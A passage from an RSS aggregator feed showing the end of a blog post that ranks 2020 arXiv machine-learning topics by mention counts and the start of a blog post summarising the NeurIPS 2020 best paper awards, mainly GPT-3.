    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.96,4.24,3.42,2.73,3.91,2.58,4.63,4.58,3.72,5.19,4.60,3.88,2.05,4.14,2.23,4.95,3.64,4.07,4.21,1.83,3.66,4.81,4.05,2.07 --></span></td>
    <td>211</td>
    <td>264</td>
  </tr>
  <tr>
    <td>10</td>
    <td>automatic speech recognition</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 0.49,1.27,1.90,5.03,3.18,2.90,3.86,1.91,2.58,5.02,3.17,3.32,3.41,2.76,2.51,1.69,5.41,4.89,3.71,4.70,0.87,3.59,6.07,3.63 --></span></td>
    <td>168</td>
    <td>249</td>
  </tr>
  <tr>
    <td>11</td>
    <td>named entity recognition</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.45,4.24,3.80,2.94,1.22,1.93,1.80,4.96,4.01,2.77,3.17,3.32,3.41,2.49,5.59,3.82,2.94,2.44,3.96,2.61,2.44,2.67,3.54,3.37 --></span></td>
    <td>167</td>
    <td>219</td>
  </tr>
  <tr>
    <td>12</td>
    <td>LSTM</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 4.93,5.08,6.08,5.03,4.89,3.38,4.88,3.63,4.01,3.29,2.69,4.16,4.10,3.59,2.23,3.15,1.88,2.44,4.95,3.39,2.61,2.98,2.70,3.63 --></span></td>
    <td>220</td>
    <td>206</td>
  </tr>
  <tr>
    <td>13</td>
    <td>BLEU score</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.97,3.81,2.66,4.61,4.65,4.03,2.06,3.82,4.29,4.15,4.12,1.39,3.75,2.49,1.96,4.05,2.35,2.44,1.73,3.13,4.53,3.44,2.70,0.78 --></span></td>
    <td>199</td>
    <td>204</td>
  </tr>
  <tr>
    <td>14</td>
    <td>neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 0.99,1.69,3.04,3.35,4.40,3.22,3.60,2.29,2.86,3.98,3.17,4.71,4.44,4.14,3.35,2.25,1.65,4.68,1.98,2.09,2.79,1.53,2.87,1.81 --></span></td>
    <td>174</td>
    <td>173</td>
  </tr>
  <tr>
    <td>15</td>
    <td>downstream tasks</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.49,2.54,1.14,1.05,0.98,1.77,1.29,1.72,1.57,1.73,2.38,2.22,2.05,1.93,2.23,3.71,2.47,2.24,2.72,1.31,2.26,2.67,2.19,2.59 --></span></td>
    <td>88</td>
    <td>173</td>
  </tr>
  <tr>
    <td>16</td>
    <td>sentiment analysis</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.96,3.39,1.90,2.10,2.20,2.25,1.54,2.86,1.43,1.21,2.69,3.60,2.05,2.76,2.51,1.80,2.82,3.05,6.19,3.92,1.92,1.38,2.36,2.33 --></span></td>
    <td>120</td>
    <td>172</td>
  </tr>
  <tr>
    <td>17</td>
    <td>classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 0.49,2.54,2.28,2.10,2.20,1.45,1.80,1.72,2.00,1.73,1.90,2.77,2.39,2.49,3.35,2.47,2.12,1.83,3.22,3.39,2.44,1.53,2.70,3.89 --></span></td>
    <td>103</td>
    <td>168</td>
  </tr>
  <tr>
    <td>18</td>
    <td>COVID-19</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,1.40,1.91,2.70,3.46,5.94,4.18,2.79,1.38,1.69,4.92 --></span></td>
    <td>0</td>
    <td>165</td>
  </tr>
  <tr>
    <td>19</td>
    <td>natural language understanding</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.99,0.42,1.14,0.84,0.98,1.45,2.57,2.29,2.15,1.38,1.27,1.11,1.71,1.38,1.12,2.36,2.12,3.26,1.73,1.57,2.61,2.14,3.37,3.37 --></span></td>
    <td>80</td>
    <td>158</td>
  </tr>
  <tr>
    <td>20</td>
    <td>generation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 0.99,1.69,1.14,1.68,2.44,2.58,1.29,2.67,2.00,1.73,2.06,1.66,1.37,1.93,1.96,3.15,2.23,2.04,0.99,2.87,2.79,2.37,1.18,2.85 --></span></td>
    <td>105</td>
    <td>155</td>
  </tr>
  <tr>
    <td></td>
    <td>Total</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 203,236,263,477,409,621,389,524,699,578,631,361,293,362,358,889,851,491,404,383,574,1309,593,386 --></span></td>
    <td>5,391</td>
    <td>6,893</td>
  </tr>
</tbody>
</table>
<!--kg-card-end: html--><!--kg-card-begin: markdown--><p>BERT, language models, and transformers are among the "hottest" methods in recent years, and their mentions are on the rise in 2020 too. The significantly larger number of "downstream tasks" mentions is most likely due to the continued interests in transfer learning.</p>
<p>On the flip side, "machine translation," "neural machine translation," and "BLEU score" were not mentioned as much. This does not mean these translation-related topics are not important, but does mean that the NLP trends have shifted to pretrained language models after the the "Transformer shock" in 2017 had subsided.</p>
<p>Other mentions that increased significantly in 2020 include "pretrain models," "fine-tuning," and "RoBERTa." The mentions of RoBERTa had increased 6-fold in 2020 compared to the previous year, cementing its position as the baseline pretrained model after BERT.</p>
<h3 id="computervisioncscv">Computer Vision (cs.CV)</h3>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table>
<thead>
  <tr>
    <th>Rank</th>
    <th>Topic</th>
    <th>Trend</th>
    <th># Papers (2019)</th>
    <th># Papers (2020)</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>accuracy</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 14.03,14.98,12.47,15.48,14.68,15.78,16.79,13.14,14.51,14.45,15.21,15.03,14.47,13.97,14.58,15.28,15.41,14.29,15.04,14.11,14.95,16.03,18.35,15.31 --></span></td>
    <td>1711</td>
    <td>2270</td>
  </tr>
  <tr>
    <td>2</td>
    <td>convolutional neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 16.40,16.25,13.87,13.01,14.98,14.59,13.39,13.43,14.14,13.59,14.65,12.23,14.34,11.76,10.86,11.48,11.42,12.38,11.32,11.09,10.23,12.55,9.92,9.44 --></span></td>
    <td>1629</td>
    <td>1689</td>
  </tr>
  <tr>
    <td>3</td>
    <td>deep neural network</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.68,7.89,8.39,6.94,10.25,7.35,6.90,7.84,5.84,8.13,7.98,8.12,5.38,8.93,6.72,7.38,6.95,8.50,7.55,6.79,9.18,7.32,8.02,7.52 --></span></td>
    <td>899</td>
    <td>1127</td>
  </tr>
  <tr>
    <td>4</td>
    <td>deep learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.39,6.94,6.53,5.91,5.42,7.14,9.27,5.78,6.03,8.23,5.16,7.75,8.19,7.04,6.15,5.96,7.90,8.42,5.45,5.96,6.82,7.76,7.59,6.32 --></span></td>
    <td>782</td>
    <td>1027</td>
  </tr>
  <tr>
    <td>5</td>
    <td>segmentation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.53,7.57,6.76,4.87,4.14,7.24,8.24,9.12,5.75,7.27,6.10,5.23,6.40,5.25,5.58,7.38,6.95,5.27,7.37,6.19,6.21,6.16,5.63,6.14 --></span></td>
    <td>758</td>
    <td>930</td>
  </tr>
  <tr>
    <td>6</td>
    <td>classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.91,6.62,5.13,5.67,5.32,6.81,5.15,4.51,4.81,3.92,4.98,4.48,5.63,4.31,5.22,4.55,5.23,5.86,5.93,4.68,6.73,5.51,6.40,3.85 --></span></td>
    <td>603</td>
    <td>801</td>
  </tr>
  <tr>
    <td>7</td>
    <td>neural network</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 6.35,4.42,4.55,4.71,5.52,5.95,5.05,4.12,3.58,4.50,4.98,4.39,6.53,7.35,4.65,4.02,4.66,7.47,5.03,4.91,6.29,4.50,4.92,3.02 --></span></td>
    <td>556</td>
    <td>777</td>
  </tr>
  <tr>
    <td>8</td>
    <td>robustness</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.99,4.73,3.50,4.23,3.65,6.16,3.40,4.31,4.71,3.35,3.85,6.16,3.46,4.83,4.57,4.02,3.81,4.84,4.55,4.83,5.07,5.80,4.85,5.41 --></span></td>
    <td>503</td>
    <td>703</td>
  </tr>
  <tr>
    <td>9</td>
    <td>computer vision</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.32,4.42,4.20,4.95,4.43,3.35,5.25,4.02,3.11,4.02,5.07,4.30,4.61,4.41,3.86,4.10,4.57,4.69,3.95,3.09,4.90,3.55,4.36,3.85 --></span></td>
    <td>505</td>
    <td>615</td>
  </tr>
  <tr>
    <td>10</td>
    <td>generative adversarial network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 6.20,6.31,5.24,3.91,5.52,3.46,4.94,4.90,4.05,6.03,4.23,5.98,4.48,4.83,3.93,3.87,3.81,4.47,3.71,3.02,3.50,3.63,4.15,4.31 --></span></td>
    <td>577</td>
    <td>587</td>
  </tr>
  <tr>
    <td>11</td>
    <td>object detection</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.36,3.15,4.66,4.23,4.14,3.03,2.99,3.14,3.77,2.87,3.85,4.11,3.33,2.84,3.79,3.58,3.52,3.88,4.49,3.09,2.97,2.76,4.01,3.67 --></span></td>
    <td>415</td>
    <td>529</td>
  </tr>
  <tr>
    <td>12</td>
    <td>detection</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.25,2.37,3.50,3.67,3.74,3.46,4.22,3.63,3.86,2.11,3.00,3.36,3.97,2.52,3.86,3.20,2.76,4.25,3.89,3.32,3.85,2.25,2.60,4.58 --></span></td>
    <td>392</td>
    <td>510</td>
  </tr>
  <tr>
    <td>13</td>
    <td>training</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.36,2.68,3.15,2.55,2.56,3.78,3.19,3.04,2.64,2.97,3.29,2.89,2.05,3.89,2.57,3.73,2.38,3.74,3.24,3.17,2.53,3.12,3.02,3.94 --></span></td>
    <td>340</td>
    <td>469</td>
  </tr>
  <tr>
    <td>14</td>
    <td><a href="http://www.image-net.org/">ImageNet</a></td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.92,3.47,3.50,3.51,3.94,3.68,2.57,2.65,3.30,2.39,3.76,2.43,2.82,3.68,2.86,2.38,3.24,3.88,3.48,2.04,3.50,3.19,2.67,2.93 --></span></td>
    <td>361</td>
    <td>455</td>
  </tr>
  <tr>
    <td>15</td>
    <td>semantic segmentation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.69,2.21,2.80,3.51,2.46,4.00,4.02,3.04,3.96,3.06,3.38,2.89,3.46,2.00,3.79,3.58,2.85,3.22,2.64,2.57,2.10,2.54,2.74,3.94 --></span></td>
    <td>380</td>
    <td>440</td>
  </tr>
  <tr>
    <td>16</td>
    <td>image classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.51,4.42,3.15,2.63,2.36,3.68,2.06,2.35,2.45,2.49,2.44,2.05,2.82,2.31,1.57,2.09,1.90,2.78,2.16,2.42,2.19,3.12,2.67,3.57 --></span></td>
    <td>307</td>
    <td>365</td>
  </tr>
  <tr>
    <td>17</td>
    <td>machine learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.36,3.63,2.21,2.39,2.27,1.73,1.34,1.47,3.11,3.73,1.60,2.61,2.69,2.42,1.93,2.31,2.38,2.56,2.16,2.26,3.15,2.83,1.76,3.12 --></span></td>
    <td>272</td>
    <td>362</td>
  </tr>
  <tr>
    <td>18</td>
    <td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFAR-10</a></td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.81,2.37,1.40,2.47,3.94,2.27,1.85,1.96,3.30,2.30,3.57,2.80,2.94,3.15,2.22,2.38,1.71,2.78,2.64,1.13,3.32,2.39,2.46,2.11 --></span></td>
    <td>303</td>
    <td>360</td>
  </tr>
  <tr>
    <td>19</td>
    <td>COVID-19</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.00,0.16,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.11,2.07,5.51,3.04,2.56,1.86,1.28,3.41,2.68,2.25,1.56 --></span></td>
    <td>1</td>
    <td>344</td>
  </tr>
  <tr>
    <td>20</td>
    <td>generalization</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.62,2.05,1.17,2.00,1.67,2.05,1.96,1.86,2.83,2.30,2.25,2.71,1.41,2.31,2.29,2.46,2.19,3.08,2.58,1.66,2.27,2.39,1.69,2.57 --></span></td>
    <td>240</td>
    <td>339</td>
  </tr>
  <tr>
    <td></td>
    <td>Total</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 677,634,858,1253,1015,925,971,1020,1061,1045,1065,1071,781,952,1399,1342,1051,1365,1669,1325,1144,1379,1422,1091 --></span></td>
    <td>11,595</td>
    <td>14,920</td>
  </tr>
</tbody>
</table><!--kg-card-end: html--><!--kg-card-begin: markdown--><p>In computer vision, COVID-19 has been mentioned significantly more in 2020, while "convolutional neural network (CNN)" and "generative adversarial network (GAN)" are on the (relative) decline.</p>
<p>Beyond rank #20, medial imaging terms such as "chest x-ray" and "CT" are on the rise, as discussed above. "Unsupervised domain adaptation" is mentioned frequently. Unsupervised representation learning appears to be one of the biggest trends in CV, as you can see from NeurIPS 2020 (e.g., <a href="https://papers.nips.cc/paper/2020/hash/fcbc95ccdd551da181207c0c1400c655-Abstract.html">Chen et al. 2020</a>, <a href="https://papers.nips.cc/paper/2020/hash/d89a66c7c80a29b1bdbab0f2a1a94af8-Abstract.html">Khosla et al. 2020</a>, <a href="https://papers.nips.cc/paper/2020/hash/70feb62b69f16e0238f741fab228fec2-Abstract.html">Caron et al. 2020</a>).</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="technicaldetails">Technical Details</h2>
<p>I'll describe how I obtained the ranking. The code for the analysis is <a href="https://github.com/octanove/mltopics">here</a>.</p>
<p>First, I collected all the paper titles and abstracts in the target categories (cs.LG, cs.CL, cs.CV) published in 2020. All the metadata on arXiv are available under <a href="https://arxiv.org/help/license">the public domain license</a>. I used <a href="https://pypi.org/project/arxiv/">arXiv API Python library</a> for fetching the data. The total number of papers analyzed for this post is 83,339.</p>
<p><img src="https://www.ml4asia.com/content/images/2020/12/scirex.png"></p><p>I then extracted ML-related mentions from …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/">https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/</a></em></p>]]>
            </description>
            <link>https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560257</guid>
            <pubDate>Mon, 28 Dec 2020 16:05:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NeurIPS 2020 Best Machine Learning Paper Awards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560166">thread link</a>) | @KukiAirani
<br/>
December 28, 2020 | https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/ | <a href="https://web.archive.org/web/*/https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="content-area">
			<div id="left-area">
											<article id="post-15764">
											 <!-- .et_post_meta_wrapper -->
				
					<div>
					<div id="et-boc">
			
		<div>
			<div><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<div><p><span>This was one hard, very hard year for all of us</span><span>.&nbsp;It was a year in which pandemic reshaped our world. It seems that this trend is going to go continue further in 2021. The field of AI, however, was not impacted that much by all these changes. At least not in a negative way. A steady flow of research papers was not stopped, in fact, we saw some quite amazing breakthroughs. That is why, for the last article of 2020, we decided to write about </span><strong>awarded </strong><span>research </span><strong>papers </strong><span>from </span><strong>Neural Information Processing Systems</strong><span> (</span><em>NeurIPS</em><span>) conference.</span></p>
<p><span> Looking at the old logo of </span><em>NeurIPS&nbsp;</em><span>conference, my wife asked me “What is that? Is that a witchcraft conference?”. Close, but no, it is one of the most </span><strong>important</strong><span> machine learning conferences. In fact, </span><span>the&nbsp;</span><em>NeurIPS </em><span>awards are something like the </span><em>Oscars </em><span>in the world of machine learning. Every year a bunch of papers is proposed to and the best papers are awarded. This was the thirty-fourth&nbsp;</span><em>NeurIPS </em><span>conference and it was held online. Interesting thing is that this years’ conference had the biggest number of </span><strong>submissions </strong><span>ever. This year 38% more papers were accepted than the last, which is 1,903 as compared to 2019’s 1,428. This says a lot about the state of the machine learning industry.&nbsp;</span></p></div>
			</div> <!-- .et_pb_text --> <!-- .et_pb_text --><p><a href="https://rubikscode.net/deep-learning-for-programmers/"><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?w=1080&amp;ssl=1" alt="" title="0" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?w=1200&amp;ssl=1 1200w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=1080%2C608&amp;ssl=1 1080w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=980%2C551&amp;ssl=1 980w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=480%2C270&amp;ssl=1 480w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span></a>
			</p><div>
				
				
				<div><p>Are you afraid that AI might take your job? Make sure you are the one who is building it.</p>
<p>STAY RELEVANT IN THE RISING AI INDUSTRY! 🖖</p>
</div>
			</div> <!-- .et_pb_text --><div>
				
				
				<div>
<p>From a huge number of submitted papers and 1903 accepted papers – 3 were awarded. This year winning papes are:</p>

<ul>
<li>Language Models are Few-Shot Learners</li>
<li>No-Regret Learning Dynamics for Extensive-Form Correlated Equilibrium</li>
<li>Improved Guarantees and a Multiple-Descent Curve for Column Subset Selection and the Nystrom Method</li>
</ul>

<p>The <em>NeurIPS </em>committee was guided by several <strong>criteria</strong>. The best paper has to be revolutionary, creative and have a certain elegance, but it has feasible, realistic and reproducible as well. It also shouldn’t be over complicated and inefficient. In our opinion committee have done an awesome job 🙂</p>
</div>
			</div> <!-- .et_pb_text --><p><span><img src="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?w=1080&amp;ssl=1" alt="Decision Tree" title="tree" srcset="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?w=1210&amp;ssl=1 1210w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=300%2C237&amp;ssl=1 300w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=1024%2C809&amp;ssl=1 1024w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=768%2C607&amp;ssl=1 768w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=1080%2C853&amp;ssl=1 1080w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=980%2C774&amp;ssl=1 980w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=480%2C379&amp;ssl=1 480w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=24%2C19&amp;ssl=1 24w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=36%2C28&amp;ssl=1 36w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=48%2C38&amp;ssl=1 48w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=600%2C474&amp;ssl=1 600w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span>
			</p><div id="gpt3">
				
				
				<p><h2 role="textbox" aria-multiline="true" contenteditable="true" aria-label="Write heading…">Language Models are Few-Shot Learners</h2></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<div>
<p>It is would be a small thing to say that GPT-3 blew us all away this year. We already see so many applications that are utilizing the concepts presented in this paper. In general, we may say that GPT-3 was the biggest disruption we saw this year, so there is no wonder why this paper won at this year’s conference. The background of this fascinating paper, released by researchers from Open AI, lies in the fact that transfer learning is becoming dominant in <strong>NLP</strong>. Meaning that the industry is heavily using models that are pre-trained on a large corpus of text and then fine-tune them on a specific task.</p>
<p><strong>Fine-tuning</strong> itself can be time-consuming. On the other hand, humans can perform a new language task from only a few examples, which is something that NLP models are trying to achieve (even though they are still far away from it). In order to improve that and generate more t<strong>ask agnostic</strong> solution, OpenAI trained <strong>GPT-3</strong> model with <strong>175 billion parameters</strong> and tested its performance without any fine-tuning. As expected, they achieve some amazing results. Just for comparison, last year’s GPT-2 had 1.5 billion parameters and this month Microsoft introduced (until now) the largest Transform based language model that had 17 billion parameters. So, yes, GPT-3 is a huge autoregressive model trained with unsupervised learning and few-shot learning.</p>
</div>
			</div> <!-- .et_pb_text --><p><span><img src="https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="undraw_predictive_analytics_kf9n" srcset="https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?w=1039&amp;ssl=1 1039w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=300%2C233&amp;ssl=1 300w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=1024%2C795&amp;ssl=1 1024w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=768%2C597&amp;ssl=1 768w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=980%2C761&amp;ssl=1 980w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=480%2C373&amp;ssl=1 480w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=24%2C19&amp;ssl=1 24w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=36%2C28&amp;ssl=1 36w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=48%2C37&amp;ssl=1 48w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=600%2C466&amp;ssl=1 600w" sizes="(max-width: 1039px) 100vw, 1039px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>Architecturally speaking, there are no changes from the <strong>GPT-2</strong> model. All the nitty-gritty details like modified initialization, pre-normalization and reversible tokenization are the same. The only <strong>difference</strong> is that that this time authors used alternating dense and locally banded sparse attention patterns in the layers of the transformer. Also, this large GPT-3 model was not the only model that is trained for the purposes of this paper. There are <strong>8 models</strong>, with parameters variating from 125 million to 175 billion parameters:</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?w=1080&amp;ssl=1" alt="" title="gpt31" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?w=589&amp;ssl=1 589w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?resize=300%2C90&amp;ssl=1 300w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?resize=480%2C144&amp;ssl=1 480w" sizes="(max-width: 589px) 100vw, 589px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>In this table, we can also see the sizes of the batches used for model training. These models are trained on following <strong>datasets</strong>:</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=1080&amp;ssl=1" alt="" title="datasetsgpt3" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=480&amp;ssl=1 480w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?resize=300%2C88&amp;ssl=1 300w" sizes="(max-width: 480px) 100vw, 480px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>The results from all the categories are mindblowing. For example, for traditional language modeling tasks, GPT-3 sets a new <strong>SOTA</strong> on the <em>Penn Tree Bank</em> dataset by a margin of 15 points based on zero-shot perplexity. GPT-3 showed amazing results in <em>question answering</em> tests. In general, these tests are separated into open-book and closed-book tests. Due to the number of possible queries, open-book tests use an information retrieval system to find relevant text and then the model learns to generate the answer from the question and retrieved text. Closed-book tests don’t have this retrieval system.</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="undraw_financial_data_es63" srcset="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?w=1378&amp;ssl=1 1378w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=300%2C196&amp;ssl=1 300w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=1024%2C670&amp;ssl=1 1024w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=768%2C502&amp;ssl=1 768w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=1080%2C706&amp;ssl=1 1080w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=1280%2C837&amp;ssl=1 1280w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=980%2C641&amp;ssl=1 980w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=480%2C314&amp;ssl=1 480w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=24%2C16&amp;ssl=1 24w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=36%2C24&amp;ssl=1 36w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=48%2C31&amp;ssl=1 48w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=600%2C392&amp;ssl=1 600w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<div><p>GPT-3 <strong>achieved</strong> 64.3% in the zero-shot setting, 68.0% in the one-shot setting, and 71.2% in the few-shot setting closed-book tests on the <em>TriviaQA</em> dataset. It <strong>outperformed</strong> fine-tuned <em>T5-11B</em> by 14.2% in a zero-shot setting. Note that <em>T5-11B</em> is finetuned, while <em>GPT-3</em> is not. It is interesting that on translation tasks, GPT-3 also sets new <strong>SOTA</strong> when it comes to translation into English. It outperforms previous unsupervised <em>NMT</em> work by 5 BLEU. For the other tasks, like Winograd-Style Tasks, Common Sense Reasoning and Reading Comprehension, GPT-3 also proved it’s superiority. Read more in the paper about it.</p>
<p>Since GPT-3 was focused on task-agnostic performance, it was not fine-tuned. This means that there is a lot more room for <strong>improvement</strong> and that we will see some results in that field rather soon.</p></div>
			</div> <!-- .et_pb_text --><div>
				
				
				<div><p>The NeurIPS commitie comment:</p>
<blockquote>
